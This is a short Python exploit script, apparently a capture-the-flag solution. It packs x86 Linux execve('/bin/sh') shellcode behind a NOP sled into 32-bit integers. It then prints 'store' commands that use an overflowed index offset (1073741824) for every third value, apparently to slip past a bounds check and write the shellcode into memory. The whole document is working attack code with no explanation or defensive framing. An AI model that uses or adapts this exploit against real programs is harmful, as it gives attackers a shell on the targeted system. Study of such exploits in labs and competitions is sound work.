padding = b'\x90\x90\x90\x90' * 4

shellcode = padding + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

ints = [int.from_bytes(shellcode[i:i+4], 'little')
        for i in range(0, len(shellcode), 4)]

modulo_var = 2147483648 * 2 // 4 #uintmax + 1 / 4 for int

for i, val in enumerate(ints):
        if i % 3 == 0:
                i += 1073741824
        print("store", val, i, sep="\n")
